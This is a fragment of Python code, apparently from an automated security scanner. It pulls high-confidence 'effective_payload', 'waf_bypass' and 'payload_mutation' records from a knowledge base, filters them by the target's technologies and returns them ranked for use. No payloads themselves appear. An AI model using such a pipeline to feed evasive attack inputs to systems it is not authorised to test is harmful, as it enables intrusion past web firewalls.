        query = select(KnowledgePattern).where(
            KnowledgePattern.pattern_type.in_(["effective_payload", "waf_bypass", "payload_mutation"]),
            KnowledgePattern.confidence >= 0.5,
        ).order_by(KnowledgePattern.confidence.desc()).limit(200)

        result = await db.execute(query)
        patterns = result.scalars().all()

        for p in patterns:
            data = p.pattern_data or {}
            payload = data.get("payload") or data.get("payloads")
            if not payload:
                continue

            # Filter by technology if we have tech info
            if techs and p.technology and p.technology.lower() not in [t.lower() for t in techs]:
                continue

            if isinstance(payload, list):
                for pl in payload[:3]:
                    payloads.append({
                        "payload": pl if isinstance(pl, str) else pl.get("payload", str(pl)),
                        "type": p.vuln_type or "generic",
                        "source": "knowledge_base",
                        "confidence": p.confidence,
                    })
            elif isinstance(payload, str):
                payloads.append({
                    "payload": payload,
                    "type": p.vuln_type or "generic",
                    "source": "knowledge_base",
                    "confidence": p.confidence,
                })

        return payloads
